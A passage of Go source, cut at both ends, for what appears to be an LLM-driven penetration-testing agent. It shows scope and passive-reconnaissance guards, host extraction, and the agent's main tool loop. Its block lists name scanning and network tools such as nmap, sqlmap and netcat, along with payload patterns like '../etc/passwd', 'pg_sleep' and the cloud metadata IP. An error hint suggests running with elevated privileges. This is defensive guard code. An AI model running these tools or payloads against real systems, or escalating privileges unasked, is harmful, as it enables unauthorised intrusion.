	// policing is no longer this guard's job.
	if lowerTool == "report_vulnerability" {
		rawTarget := strings.TrimSpace(toolArgs["target"])
		rawEndpoint := strings.TrimSpace(toolArgs["endpoint"])
		for _, raw := range []string{rawTarget, rawEndpoint} {
			if raw == "" {
				continue
			}
			if scopeguard.IsLocalOrListener(a.localGuard, raw) {
				return true, fmt.Sprintf(
					"report_vulnerability target/endpoint %q points at the operator's machine or local network. "+
						"Refusing to probe localhost / RFC1918 / the dashboard's "+
						"listener from a Gated_Tool.", raw,
				)
			}
		}
	}

	return false, ""
}

// extractHostsFromArgs scans every value in toolArgs for URL/host
// tokens and returns the lowercased hostnames found. Tokens with no
// host are dropped. Used by shouldBlockForOutOfScope.
func extractHostsFromArgs(toolArgs map[string]string) []string {
	seen := make(map[string]bool)
	var out []string
	for _, raw := range toolArgs {
		raw = strings.TrimSpace(raw)
		if raw == "" {
			continue
		}
		// LLM tool arguments are already capped at 32 KB upstream
		// before reaching this guard, so no per-value truncation is
		// performed here. The tokenizer runs over the raw value.
		for _, span := range extractEmbeddedURLs(raw) {
			h := extractHostFromTokenForScope(span)
			if h == "" || seen[h] {
				continue
			}
			seen[h] = true
			out = append(out, h)
		}
		for _, tok := range scopeHostTokenSplit(raw) {
			h := extractHostFromTokenForScope(tok)
			if h == "" || seen[h] {
				continue
			}
			seen[h] = true
			out = append(out, h)
		}
	}
	return out
}

// scopeHostTokenSplit splits a free-form string into tokens that are
// candidates for host extraction. Splits on whitespace and common
// shell metacharacters so URLs inside curl/python invocations are
// still found. The separator set is owned by scopeTokenSeparator so
// extractEmbeddedURLs and the tokenizer pass agree on token edges.
func scopeHostTokenSplit(s string) []string {
	return strings.FieldsFunc(s, scopeTokenSeparator)
}

// extractHostFromTokenForScope pulls a hostname out of a token, or
// returns "" if the token is not host-shaped. Accepts:
//
//   - http(s)://host[:port]/path
//   - host:port
//   - bare host (must contain a dot or be a literal IP)
//   - [ipv6]
func extractHostFromTokenForScope(token string) string {
	token = strings.TrimSpace(token)
	if token == "" {
		return ""
	}
	// Strip trailing punctuation, but NOT brackets — `[ipv6]:port`
	// needs them preserved for net.SplitHostPort to recognize the
	// shape.
	token = strings.Trim(token, ".,;:?!(){}\"'`<>")

	if strings.Contains(token, "://") {
		if u, err := url.Parse(token); err == nil && u.Hostname() != "" {
			return strings.ToLower(u.Hostname())
		}
	}

	if h, _, err := net.SplitHostPort(token); err == nil && h != "" {
		// SplitHostPort keeps brackets around the host for [ipv6]:port,
		// so peel them and accept the inner IP literal.
		h = strings.TrimPrefix(h, "[")
		h = strings.TrimSuffix(h, "]")
		return strings.ToLower(h)
	}

	if ip := net.ParseIP(token); ip != nil {
		return strings.ToLower(token)
	}
	if strings.HasPrefix(token, "[") && strings.HasSuffix(token, "]") {
		inner := token[1 : len(token)-1]
		if net.ParseIP(inner) != nil {
			return strings.ToLower(inner)
		}
	}
	if strings.Contains(token, ".") && !strings.ContainsAny(token, " /\\") {
		if strings.HasPrefix(token, "./") || strings.HasPrefix(token, "../") || strings.HasPrefix(token, "/") {
			return ""
		}
		if isVersionLike(token) {
			return ""
		}
		// Filter file-name shaped tokens (notes.json, scan.txt,
		// recon.csv) so local artifact analysis isn't blocked.
		if looksLikeFilename(token) {
			return ""
		}
		return strings.ToLower(token)
	}
	return ""
}

// looksLikeFilename returns true when token has the shape <name>.<ext>
// with a recognized extension. Used by extractHostFromTokenForScope to
// avoid treating filenames as hostnames. The extension list is short
// — TLDs that overlap with extensions (e.g. ".sh" for Saint Helena)
// are uncommon and real URLs usually have at least one label before
// the TLD anyway.
func looksLikeFilename(token string) bool {
	idx := strings.LastIndex(token, ".")
	if idx <= 0 || idx == len(token)-1 {
		return false
	}
	ext := strings.ToLower(token[idx+1:])
	switch ext {
	case "txt", "json", "csv", "log", "yaml", "yml", "xml", "html", "htm",
		"md", "sh", "py", "js", "ts", "tsx", "jsx", "go", "rs", "rb",
		"php", "java", "cpp", "tar", "gz", "zip", "tgz",
		"pdf", "png", "jpg", "jpeg", "gif", "svg", "webp", "ico",
		"sql", "db", "sqlite", "pem", "key", "crt", "pcap", "har":
		return true
	}
	return false
}

// isVersionLike returns true for strings that are entirely digits +
// dots ("1.2.3", "10.0", "v1.0.0"). Used by
// extractHostFromTokenForScope to skip CLI version arguments.
func isVersionLike(s string) bool {
	s = strings.TrimPrefix(s, "v")
	if s == "" {
		return false
	}
	for _, r := range s {
		if r != '.' && (r < '0' || r > '9') {
			return false
		}
	}
	return strings.Contains(s, ".")
}

// extractEmbeddedURLs scans s for case-insensitive "http://" and
// "https://" substrings and returns each contiguous URL span. Each
// span starts at a scheme-prefix occurrence and ends at the first
// scopeHostTokenSplit separator rune or the end of s, whichever
// comes first. The helper lets the host-extraction path see URLs
// embedded inside query-parameter redirects, userinfo wrappers, and
// other key=value forms before scopeHostTokenSplit's separator pass
// runs over the same value. When a span cannot be parsed as a URL
// later, extractHostFromTokenForScope drops it silently and the
// separator pass still recovers any bare host.
func extractEmbeddedURLs(s string) []string {
	if s == "" {
		return nil
	}
	var out []string
	n := len(s)
	for i := 0; i < n; {
		prefixLen := 0
		switch {
		case i+7 <= n && strings.EqualFold(s[i:i+7], "http://"):
			prefixLen = 7
		case i+8 <= n && strings.EqualFold(s[i:i+8], "https://"):
			prefixLen = 8
		}
		if prefixLen == 0 {
			i++
			continue
		}
		end := i + prefixLen
	span:
		for end < n {
			r, size := utf8.DecodeRuneInString(s[end:])
			if size == 0 {
				size = 1
			}
			if scopeTokenSeparator(r) {
				break span
			}
			end += size
		}
		out = append(out, s[i:end])
		i = end
	}
	return out
}

// scopeTokenSeparator reports whether r is one of the runes
// scopeHostTokenSplit treats as a token boundary. Kept in lockstep
// with that function's switch so the URL sweep and the separator-pass
// tokenizer agree on token edges.
func scopeTokenSeparator(r rune) bool {
	switch r {
	case ' ', '\t', '\n', '\r',
		'"', '\'', '`',
		'(', ')', '{', '}', '[', ']',
		',', ';', '|', '&', '<', '>',
		'=', '?', '#', '@':
		return true
	}
	return false
}

func passivePolicyBlockReason(passiveScan bool) string {
	if passiveScan {
		return "Passive scanning is enabled, so direct target access and active probes are blocked. Use web_search, public passive datasets, existing notes, or already collected artifacts instead."
	}
	return "Passive reconnaissance is enabled for this phase, so direct target access and active recon probes are blocked. Use web_search, public passive datasets, existing notes, or already collected artifacts instead."
}

func referencesActivityTarget(text string, hosts []string) bool {
	for _, host := range hosts {
		if host == "" {
			continue
		}
		if strings.Contains(text, host) {
			return true
		}
	}
	return false
}

func isAllowedLocalArtifactAnalysis(toolName string, toolArgs map[string]string) bool {
	switch toolName {
	case "terminal_execute":
		cmd := strings.TrimSpace(strings.ToLower(toolArgs["command"]))
		if cmd == "" {
			return false
		}
		if containsActiveAccessPattern(cmd) || containsPassiveLookupBreaker(cmd) {
			return false
		}
		readOnlyPrefixes := []string{
			"cat ", "grep ", "egrep ", "fgrep ", "rg ", "jq ", "sed ", "awk ",
			"sort ", "uniq ", "wc ", "head ", "tail ", "cut ", "tr ", "find ",
			"ls ", "stat ", "file ",
		}
		for _, prefix := range readOnlyPrefixes {
			if strings.HasPrefix(cmd, prefix) {
				return true
			}
		}
		return false
	case "python_action":
		code := strings.ToLower(toolArgs["code"] + " " + toolArgs["script"])
		if code == "" || containsActiveAccessPattern(code) {
			return false
		}
		networkMarkers := []string{"requests", "urllib", "http.client", "socket", "subprocess", "os.system", "popen("}
		for _, marker := range networkMarkers {
			if strings.Contains(code, marker) {
				return false
			}
		}
		return strings.Contains(code, "open(") || strings.Contains(code, "pathlib") || strings.Contains(code, "json.load")
	default:
		return false
	}
}

func isAllowedPassiveLookup(text string, hosts []string) bool {
	passiveSources := []string{
		"crt.sh", "web.archive.org", "dns.bufferover.run", "urlscan.io",
		"otx.alienvault.com", "alienvault.com", "censys.io", "shodan.io",
		"rapiddns.io", "certspotter.com", "securitytrails.com", "virustotal.com",
		"github.com", "google.com/search", "bing.com/search",
	}
	for _, source := range passiveSources {
		if strings.Contains(text, source) && !containsDirectTargetURL(text, hosts) && !containsPassiveLookupBreaker(text) {
			return true
		}
	}
	if strings.Contains(text, "subfinder ") || strings.Contains(text, " subfinder") ||
		strings.Contains(text, "assetfinder ") || strings.Contains(text, " assetfinder") ||
		strings.Contains(text, "findomain ") || strings.Contains(text, " findomain") ||
		strings.Contains(text, "amass enum -passive") {
		blockers := []string{" -active", " dnsx", " httpx", " nmap", " naabu", " masscan", " puredns", " shuffledns"}
		for _, blocker := range blockers {
			if strings.Contains(text, blocker) {
				return false
			}
		}
		return true
	}
	return false
}

func containsPassiveLookupBreaker(text string) bool {
	breakers := []string{
		"nmap", "masscan", "naabu", "httpx", "ffuf", "gobuster", "feroxbuster",
		"dirsearch", "katana", "gospider", "nuclei", "sqlmap", "dalfox", "nikto",
		"wpscan", "whatweb", "dnsx", "massdns", "puredns", "shuffledns",
	}
	for _, breaker := range breakers {
		if strings.Contains(text, breaker) {
			return true
		}
	}
	return false
}

func containsDirectTargetURL(text string, hosts []string) bool {
	for _, host := range hosts {
		if host == "" {
			continue
		}
		if strings.Contains(text, "http://"+host) || strings.Contains(text, "https://"+host) ||
			strings.Contains(text, "http://www."+host) || strings.Contains(text, "https://www."+host) {
			return true
		}
	}
	return false
}

func containsActiveAccessPattern(text string) bool {
	patterns := []string{
		"browser_action", "page_agent",
		"curl ", " wget ", "httpx", "nmap", "masscan", "naabu",
		"ffuf", "gobuster", "feroxbuster", "dirsearch", "katana", "gospider", "hakrawler",
		"nuclei", "sqlmap", "dalfox", "nikto", "wpscan", "joomscan", "whatweb", "wafw00f",
		"dnsx", "massdns", "puredns", "shuffledns", " dig ", " host ", "nslookup",
		"ping ", "traceroute", "openssl s_client", " nc ", "netcat", "telnet ",
		"<script", "alert(", "sleep(", "pg_sleep", "waitfor delay", "../etc/passwd", "/etc/passwd",
		"169.254.169.254", "burp collaborator",
	}
	padded := " " + text + " "
	for _, pattern := range patterns {
		if strings.Contains(padded, pattern) {
			return true
		}
	}
	return false
}

// Run starts the agent loop with the given targets and instructions.
func (a *Agent) Run(targets []string, instruction string) {
	a.scanStart = time.Now()
	ratePolicy := EffectiveRequestRatePolicy(a.cfg, instruction)
	if a.scanCtx != nil {
		a.scanCtx.SetRequestRatePolicy(ratePolicy)
	}

	// Start watchdog
	stopWatchdog := a.startWatchdog()
	defer stopWatchdog()

	systemPrompt := a.buildSystemPrompt(targets, instruction, ratePolicy)
	a.messages = []llm.Message{
		{Role: "system", Content: systemPrompt},
	}

	userMsg := a.buildInitialUserMessage(targets, instruction)
	a.messages = append(a.messages, llm.Message{Role: "user", Content: userMsg})

	// Initialize scan state for hooks (replaces 17+ local tracking variables)
	a.state = NewScanState()
	a.state.DiscoveryMode = a.discoveryMode
	a.state.AllowedPhases = append([]int(nil), a.allowedPhases...)
	a.state.ReconOnlyMode = isReconReportOnlyPhaseSelection(a.allowedPhases)
	if a.state.ReconOnlyMode {
		a.state.DiscoveryMode = true
	}
	a.resetPassiveReconGuardForRun()

	// Helper to get current token count
	tokenCount := func() int {
		_, _, total := a.client.GetTokens()
		return total
	}

	for iter := 0; (a.maxIter == 0 || iter < a.maxIter) && !a.stopped.Load() && (a.ctx == nil || a.ctx.Err() == nil); iter++ {
		// Reset activity watchdog on each iteration — IMMEDIATELY, no delay
		a.touchActivity()
		a.state.Iteration = iter
		if guardMsg := a.maybeCompletePassiveReconGuardAtIterationStart(iter); guardMsg != "" {
			a.msgMu.Lock()
			a.messages = append(a.messages, llm.Message{Role: "user", Content: guardMsg})
			a.msgMu.Unlock()
			a.emit(Event{Type: "message", Content: guardMsg, TotalTokens: tokenCount()})
		}

		if a.maxIter > 0 {
			a.emit(Event{Type: "thinking", Content: fmt.Sprintf("Iteration %d/%d", iter+1, a.maxIter), TotalTokens: tokenCount()})
		} else {
			a.emit(Event{Type: "thinking", Content: fmt.Sprintf("Iteration %d", iter+1), TotalTokens: tokenCount()})
		}

		// ── Hook: OnIterationStart ──
		iterResult := a.hooks.Fire(OnIterationStart, a.state, nil)
		if iterResult.Nudge != "" {
			a.msgMu.Lock()
			a.messages = append(a.messages, llm.Message{Role: "user", Content: iterResult.Nudge})
			a.msgMu.Unlock()
		}
		if iterResult.EmitMessage != "" {
			a.emit(Event{Type: "message", Content: iterResult.EmitMessage, TotalTokens: tokenCount()})
		}

		// Proactively prune before the LLM call when the accumulated
		// message buffer has grown past pruneThresholdBytes. This is the
		// pre-LLM pruning gate (Requirement 2.3 / Property P2.3) — it
		// supplements the existing post-iteration prune at the end of
		// the loop and the context-overflow recovery branch below, so
		// the serialized buffer is bounded before every outbound call,
		// not only after a 413 from the provider.
		if a.shouldPruneBeforeLLM() {
			a.pruneMessages()
		}

		// Snapshot the message buffer under msgMu before handing it to the
		// LLM client. Chat() ranges over the slice to serialize the request
		// while SendMessage() (called from the web chat handler on another
		// goroutine) may append concurrently. Reading a.messages directly
		// here is a data race: a concurrent append can reallocate the backing
		// array mid-serialization. Copying under the lock gives Chat a stable
		// view; messages that arrive during the call are picked up next iter.
		a.msgMu.Lock()
		msgsSnapshot := make([]llm.Message, len(a.messages))
		copy(msgsSnapshot, a.messages)
		a.msgMu.Unlock()

		response, err := a.client.Chat(msgsSnapshot)
		// Update activity after LLM response
		a.touchActivity()

		if err != nil {
			a.state.ConsecutiveErrors++
			errStr := err.Error()
			isContextOverflow := strings.Contains(errStr, "context window") ||
				strings.Contains(errStr, "context overflow") ||
				strings.Contains(errStr, "maximum context length") ||
				strings.Contains(errStr, "too many tokens") ||
				strings.Contains(errStr, "token limit")

			if isContextOverflow {
				// Context window overflow: force-prune messages so the next
				// attempt has a smaller payload. Don't count this as a
				// consecutive error — it's recoverable via pruning.
				a.emit(Event{Type: "error", Content: fmt.Sprintf("⚠️ Context window overflow — force-pruning message history (%d messages)", len(a.messages)), TotalTokens: tokenCount()})
				a.forcePruneMessages()
				a.state.ConsecutiveErrors-- // don't penalize for recoverable overflow
				if a.state.ConsecutiveErrors < 0 {
					a.state.ConsecutiveErrors = 0
				}
				continue
			}

			// Rate limit: wait indefinitely with 30-minute intervals until
			// the LLM recovers. Don't count toward consecutive errors and
			// don't skip the current target.
			isRateLimited := strings.Contains(errStr, "rate limited") ||
				strings.Contains(errStr, "429") ||
				strings.Contains(errStr, "too many requests") ||
				strings.Contains(errStr, "Too Many Requests")
			if isRateLimited {
				a.state.ConsecutiveErrors-- // undo the increment above
				if a.state.ConsecutiveErrors < 0 {
					a.state.ConsecutiveErrors = 0
				}
				// Bound the total time the scan may spend parked on provider
				// rate limits. Without a ceiling a persistently 429'd provider
				// keeps the scan alive forever (touchActivity defeats the idle
				// watchdog on purpose during the wait). Once the cumulative
				// wait exceeds maxCumulativeRateLimitWait, fail the scan cleanly.
				if maxCumulativeRateLimitWait > 0 && a.state.CumulativeRateLimitWait >= maxCumulativeRateLimitWait {
					a.emit(Event{Type: "error", Content: fmt.Sprintf("⛔ Agent stopped: LLM provider rate limited for a cumulative %s without recovering.", a.state.CumulativeRateLimitWait), TotalTokens: tokenCount()})
					a.emit(Event{Type: "finished", Content: fmt.Sprintf("Agent stopped: provider rate limited for a cumulative %s without recovering.", a.state.CumulativeRateLimitWait), TotalTokens: tokenCount()})
					return
				}
				a.emit(Event{Type: "error", Content: "⏳ Rate limited by LLM provider — waiting 30 minutes before retrying (will NOT skip this target)", TotalTokens: tokenCount()})
				// Sleep in 1-minute chunks so we can bail out if the agent is stopped
				for waited := 0; waited < 30; waited++ {
					if a.stopped.Load() || (a.ctx != nil && a.ctx.Err() != nil) {
						break
					}
					time.Sleep(1 * time.Minute)
					a.state.CumulativeRateLimitWait += 1 * time.Minute
				}
				a.touchActivity() // keep watchdog alive during long wait
				continue
			}

			a.emit(Event{Type: "error", Content: fmt.Sprintf("LLM error (attempt %d/25): %s", a.state.ConsecutiveErrors, errStr), TotalTokens: tokenCount()})
			if a.state.ConsecutiveErrors >= 25 {
				a.emit(Event{Type: "error", Content: fmt.Sprintf("⛔ Agent stopped: LLM failed %d consecutive times. Last error: %s", a.state.ConsecutiveErrors, errStr), TotalTokens: tokenCount()})
				a.emit(Event{Type: "finished", Content: fmt.Sprintf("Agent stopped: LLM failed %d consecutive times. Last error: %s", a.state.ConsecutiveErrors, errStr), TotalTokens: tokenCount()})
				return
			}
			// Exponential backoff: 10s, 20s, 30s... capped at 120s
			// Long-running wildcard scans need more tolerance for transient API issues
			backoff := time.Duration(a.state.ConsecutiveErrors*10) * time.Second
			if backoff > 120*time.Second {
				backoff = 120 * time.Second
			}
			time.Sleep(backoff)
			continue
		}
		// ConsecutiveErrors reset is handled by OnHealthyResponse hook below

		// ── Hook: OnEmptyResponse ──
		if response == "" {
			emptyResult := a.hooks.Fire(OnEmptyResponse, a.state, nil)
			a.emit(Event{Type: "message", Content: fmt.Sprintf("⚠️ LLM returned empty response (%d/12)", a.state.EmptyResponseCount), TotalTokens: tokenCount()})
			if emptyResult.ForceSkip {
				a.emit(Event{Type: "error", Content: emptyResult.EmitMessage, TotalTokens: tokenCount()})
				a.emit(Event{Type: "finished", Content: "Agent stopped: LLM returned too many empty responses", TotalTokens: tokenCount()})
				return
			}
			if emptyResult.Nudge != "" {
				a.msgMu.Lock()
				a.messages = append(a.messages, llm.Message{Role: "user", Content: emptyResult.Nudge})
				a.msgMu.Unlock()
			}
			continue
		}
		// EmptyResponseCount reset is handled by OnHealthyResponse hook below

		// Strip <think>...</think> blocks for parsing
		responseClean := stripThink(response)

		// Show the LLM's text
		cleanText := llm.CleanContent(responseClean)
		cleanText = strings.TrimSpace(cleanText)
		if cleanText != "" {
			a.emit(Event{Type: "message", Content: cleanText, TotalTokens: tokenCount()})
		}

		a.msgMu.Lock()
		a.messages = append(a.messages, llm.Message{Role: "assistant", Content: response})
		a.msgMu.Unlock()

		toolCalls := llm.ParseToolCalls(responseClean)

		// ── Hook: OnNoToolResponse ──
		if len(toolCalls) == 0 {
			noToolResult := a.hooks.Fire(OnNoToolResponse, a.state, nil)
			if noToolResult.ForceSkip {
				a.emit(Event{Type: "error", Content: noToolResult.EmitMessage, TotalTokens: tokenCount()})
				a.emit(Event{Type: "finished", Content: "Agent stopped: LLM refused to call tools after 15 attempts", TotalTokens: tokenCount()})
				return
			}
			if noToolResult.Nudge != "" {
				a.msgMu.Lock()
				a.messages = append(a.messages, llm.Message{Role: "user", Content: noToolResult.Nudge})
				a.msgMu.Unlock()
			}
			continue
		}
		// Non-empty response with tool calls = healthy. Reset all error counters.
		a.hooks.Fire(OnHealthyResponse, a.state, nil)

		for _, tc := range toolCalls {
			if a.stopped.Load() {
				break
			}
			if tc.Name == "terminal_execute" {
				if command, ok := tc.Args["command"]; ok {
					contextID := ""
					if a.scanCtx != nil {
						contextID = a.scanCtx.ID
					}
					normalized, note := terminal.NormalizeCommandForRequestRatePolicy(contextID, command)
					if normalized != command {
						updatedArgs := make(map[string]string, len(tc.Args))
						for k, v := range tc.Args {
							updatedArgs[k] = v
						}
						updatedArgs["command"] = normalized
						tc.Args = updatedArgs
						if note != "" {
							a.emit(Event{Type: "message", Content: note, TotalTokens: tokenCount()})
						}
					}
				}
			}

			// ── Hook: OnToolCall (work tracking + stuck tracking) ──
			toolArgs := map[string]string{
				"tool_name": tc.Name,
			}
			for k, v := range tc.Args {
				toolArgs[k] = v
			}

			if blocked, reason := a.shouldBlockForActivityPolicy(tc.Name, tc.Args); blocked {
				blockMsg := "⛔ ACTIVITY POLICY BLOCKED TOOL — " + reason
				a.emit(Event{Type: "tool_call", ToolName: tc.Name, ToolArgs: tc.Args})
				a.emit(Event{Type: "tool_result", ToolName: tc.Name, ToolResult: tools.Result{Output: blockMsg}, TotalTokens: tokenCount()})
				a.msgMu.Lock()
				a.messages = append(a.messages, llm.Message{Role: "user", Content: blockMsg})
				a.msgMu.Unlock()
				continue
			}

			if blocked, reason := a.shouldBlockForPhaseRestriction(tc.Name, tc.Args); blocked {
				blockMsg := "⛔ PHASE RESTRICTION BLOCKED TOOL — " + reason
				a.emit(Event{Type: "tool_call", ToolName: tc.Name, ToolArgs: tc.Args})
				a.emit(Event{Type: "tool_result", ToolName: tc.Name, ToolResult: tools.Result{Output: blockMsg}, TotalTokens: tokenCount()})
				a.msgMu.Lock()
				a.messages = append(a.messages, llm.Message{Role: "user", Content: blockMsg})
				a.msgMu.Unlock()
				continue
			}

			// ── In-scope guard ──
			// Runs UNCONDITIONALLY (active and passive). Probes and
			// finding reports for hosts not derived from the configured
			// scan target are rejected — prevents the agent from
			// pivoting to third-party hosts discovered via DNS, port
			// scans, related infrastructure, etc.
			if blocked, reason := a.shouldBlockForOutOfScope(tc.Name, tc.Args); blocked {
				blockMsg := "⛔ OUT-OF-SCOPE TARGET BLOCKED — " + reason
				a.emit(Event{Type: "tool_call", ToolName: tc.Name, ToolArgs: tc.Args})
				a.emit(Event{Type: "tool_result", ToolName: tc.Name, ToolResult: tools.Result{Output: blockMsg}, TotalTokens: tokenCount()})
				a.msgMu.Lock()
				a.messages = append(a.messages, llm.Message{Role: "user", Content: blockMsg})
				a.msgMu.Unlock()
				continue
			}

			a.hooks.Fire(OnToolCall, a.state, toolArgs)

			// ── Hook: OnStuckCheck (nudge/force-skip based on stuck counters) ──
			stuckResult := a.hooks.Fire(OnStuckCheck, a.state, toolArgs)
			if stuckResult.EmitMessage != "" {
				a.emit(Event{Type: "error", Content: stuckResult.EmitMessage, TotalTokens: tokenCount()})
			}
			if stuckResult.Nudge != "" {
				a.msgMu.Lock()
				a.messages = append(a.messages, llm.Message{Role: "user", Content: stuckResult.Nudge})
				a.msgMu.Unlock()
			}
			if stuckResult.CleanupBrowser {
				browser.CleanupContext(a.scanCtx.ID)
			}
			if stuckResult.ForceSkip {
				continue // skip executing this tool call
			}

			a.emit(Event{
				Type:     "tool_call",
				ToolName: tc.Name,
				ToolArgs: tc.Args,
			})

			// Execute tool ASYNC with heartbeat monitoring
			result, err := a.executeToolAsync(tc.Name, tc.Args)
			if err != nil {
				result = tools.Result{Error: err.Error()}
			}

			a.emit(Event{
				Type:        "tool_result",
				ToolName:    tc.Name,
				ToolResult:  result,
				TotalTokens: tokenCount(),
			})

			// ── Hook: OnToolResult (WAF detection, tech detection) ──
			resultArgs := map[string]string{
				"tool_name": tc.Name,
				"output":    result.Output,
				"error":     result.Error,
			}
			toolResultHook := a.hooks.Fire(OnToolResult, a.state, resultArgs)
			if toolResultHook.EmitMessage != "" {
				a.emit(Event{Type: "message", Content: toolResultHook.EmitMessage, TotalTokens: tokenCount()})
			}

			// ── Hook: OnFinishAttempt ──
			if tc.Name == "finish" || (result.Metadata != nil && result.Metadata["finished"] == true) {
				finishResult := a.hooks.Fire(OnFinishAttempt, a.state, nil)
				if finishResult.Block {
					rejectMsg := fmt.Sprintf("⚠️ FINISH REJECTED — %s\n\nDO NOT call finish again until you have done more testing.\nContinue with the NEXT PHASE of testing NOW.", finishResult.BlockReason)
					a.emit(Event{Type: "tool_result", ToolName: "finish", ToolResult: tools.Result{Output: rejectMsg}, TotalTokens: tokenCount()})
					a.msgMu.Lock()
					a.messages = append(a.messages, llm.Message{Role: "user", Content: rejectMsg})
					a.msgMu.Unlock()
					// Finish was rejected — switch to validator temperature (0.0)
					// for deterministic re-verification of coverage gaps
					a.client.SetTemperature(TempValidator)
					continue
				}
				a.emit(Event{Type: "finished", Content: result.Output, TotalTokens: tokenCount()})
				return
			}

			resultMsg := formatToolResult(tc.Name, result)
			a.msgMu.Lock()
			a.messages = append(a.messages, llm.Message{Role: "user", Content: resultMsg})
			a.msgMu.Unlock()

			// ── Per-role temperature switching ──
			// Adjust LLM temperature based on what the agent is about to do
			// next, inferred from the tool it just called.
			switch tc.Name {
			case "report_vulnerability":
				// Next response will write/refine a vulnerability report
				a.client.SetTemperature(TempReporter)
			case "add_note", "read_notes":
				// Next response involves analysis/reasoning about findings
				a.client.SetTemperature(TempReasoner)
			default:
				// Default scanning temperature for all other tools
				a.client.SetTemperature(TempScanner)
			}
		}
		// Prune message history to prevent context window overflow
		a.pruneMessages()
		// ZERO DELAY — immediately proceed to next iteration
	}

	a.emit(Event{Type: "finished", Content: "Agent reached maximum iterations", TotalTokens: tokenCount()})
}

// Stop signals the agent to stop and kills all running processes.
func (a *Agent) Stop() {
	a.stopped.Store(true)

	if a.cancel != nil {
		a.cancel()
	}

	// NOTE: Do NOT call terminal.KillAllProcesses() or browser.CleanupBrowser()
	// here — those are GLOBAL operations that kill processes across ALL instances.
	// Per-instance cleanup is handled by sctx.Close() in sess.cleanup().
	// The handleStop handler calls terminal.KillAllProcesses() directly for
	// user-initiated "Stop All" operations.
}

// SendMessage injects an operator message into the running scan's
// conversation history so the agent picks it up on its next iteration.
// Routing it through the message buffer (instead of issuing a separate
// LLM call) avoids concurrent Chat() calls that would corrupt history.
//
// This is fire-and-forget: the returned string is an acknowledgement
// that the message was queued, NOT the agent's reply. The agent's
// response to the message surfaces later as normal scan events on the
// live feed. The error is non-nil only when the agent is already stopped.
func (a *Agent) SendMessage(message string) (string, error) {
	if a.stopped.Load() {
		return "", fmt.Errorf("agent is not running")
	}

	a.msgMu.Lock()
	a.messages = append(a.messages, llm.Message{
		Role:    "user",
		Content: "[USER MESSAGE DURING SCAN]: " + message,
	})
	a.msgMu.Unlock()

	// Emit as a visible event so it appears in the feed
	a.emit(Event{Type: "message", Content: fmt.Sprintf("📨 User message received: %s", message)})

	return "Message received and will be processed on the next iteration.", nil
}

// formatToolResult formats tool execution results with helpful suggestions
func formatToolResult(toolName string, result tools.Result) string {
	output := result.Output
	errorMsg := result.Error

	var msg string
	if errorMsg != "" {
		msg = fmt.Sprintf("Tool '%s' error: %s\n", toolName, errorMsg)
		msg += getToolSuggestion(toolName, errorMsg)
	} else if output != "" {
		msg = fmt.Sprintf("Tool '%s' result:\n%s", toolName, output)
	} else {
		msg = fmt.Sprintf("Tool '%s' completed successfully (no output)", toolName)
	}

	return msg
}

// getToolSuggestion provides helpful suggestions when a tool fails
func getToolSuggestion(toolName, errorMsg string) string {
	lower := strings.ToLower(errorMsg)

	switch {
	case strings.Contains(toolName, "terminal") || strings.Contains(toolName, "browser"):
		if strings.Contains(lower, "not found") || strings.Contains(lower, "no such file") {
			return "Suggestion: The command or tool was not found. Try using a different approach or check if the tool is installed.\n"
		}
		if strings.Contains(lower, "permission denied") || strings.Contains(lower, "access denied") {
			return "Suggestion: Permission denied. Try running with elevated privileges or use a different method.\n"
		}
		if strings.Contains(lower, "cancel") {
			return "Suggestion: Command was canceled. The agent may have been stopped or the command was taking too long.\n"
		}
		if strings.Contains(lower, "connection") || strings.Contains(lower, "network") {
			return "Suggestion: Network error. Check the target URL and try again.\n"
		}

	case strings.Contains(toolName, "python"):
		if strings.Contains(lower, "no module") || strings.Contains(lower, "import error") {
			return "Suggestion: Missing Python module. Try installing the required package or use an alternative approach.\n"
		}
		if strings.Contains(lower, "syntax") {
			return "Suggestion: Python syntax error. Check the script for errors.\n"
		}

	case strings.Contains(toolName, "browser"):
		if strings.Contains(lower, "chrome") || strings.Contains(lower, "chromium") {
			return "Suggestion: Browser automation issue. Try using send_request instead for HTTP interactions.\n"
		}

	case strings.Contains(toolName, "proxy"):
		if strings.Contains(lower, "connection refused") {
			return "Suggestion: Proxy connection failed. Make sure Caido is running or use direct HTTP requests.\n"
		}
	}

	return ""
}

// pruneMessages trims the message history to prevent context window overflow.
// Strategy: keep system prompt (msg[0]), keep last N messages, and re-inject
// all saved notes so the agent retains accumulated knowledge.
// alignPruneCutoff returns an index >= start such that messages[idx:]
// begins with an "assistant" message (or, if no assistant message remains
// after start, the last message). pruneMessages inserts a synthetic "user"
// message right before the kept tail; advancing the cutoff to an assistant
// boundary preserves user/assistant alternation, which Anthropic enforces
// strictly. Pure function so it's straightforward to regression-test.
func alignPruneCutoff(messages []llm.Message, start int) int {
	if start < 1 {
		start = 1
	}
	cutoff := start
	for cutoff < len(messages) && messages[cutoff].Role != "assistant" {
		cutoff++
	}
	if cutoff >= len(messages) {
		// No assistant message remains after `start`. Keep at least the
		// last message rather than pruning everything below the system
		// prompt.
		cutoff = len(messages) - 1
		if cutoff < 1 {
			cutoff = 1
		}
	}
	return cutoff
}

// pruneThresholdBytes is the serialized message-buffer ceiling used by
// shouldPruneBeforeLLM. ~800 KiB ≈ ~200K tokens at ~4 bytes per token,
// safely below the smallest provider context window we target while
// leaving headroom for the system prompt + a multi-turn tool dialog.
const pruneThresholdBytes = 800 * 1024

// perMessageOverheadBytes accounts for role tags, JSON delimiters, and
// per-message structural overhead added by the provider serializer that
// is not visible in Message.Content alone.
const perMessageOverheadBytes = 50

// shouldPruneBeforeLLM reports whether the agent's current message buffer
// would serialize larger than pruneThresholdBytes and therefore should be
// pruned before the next outbound LLM call. Cheap byte-count heuristic:
// no tokenizer dependency and no allocations beyond the message slice.
//
// Implements Requirement 2.3 (bounded message history before LLM calls)
// and underwrites Property P2.3.
func (a *Agent) shouldPruneBeforeLLM() bool {
	a.msgMu.Lock()
	defer a.msgMu.Unlock()

	size := 0
	for i := range a.messages {
		size += len(a.messages[i].Content) + perMessageOverheadBytes
		if size > pruneThresholdBytes {
			return true
		}
	}
	return false
}

func (a *Agent) pruneMessages() {
	a.msgMu.Lock()
	defer a.msgMu.Unlock()

	const maxMessages = 100

	if len(a.messages) <= maxMessages {
		return
	}

	// Keep system prompt (index 0) + the most recent keepRecent messages
	keepRecent := 60
	if keepRecent > len(a.messages)-1 {
		keepRecent = len(a.messages) - 1
	}

	originalLen := len(a.messages)

	// Build pruned list: system prompt + compacted history + recent messages
	cutoff := alignPruneCutoff(a.messages, len(a.messages)-keepRecent)

	// Compact the pruned messages into a structured digest
	digest := compactMessages(a.messages[1:cutoff]) // skip system prompt

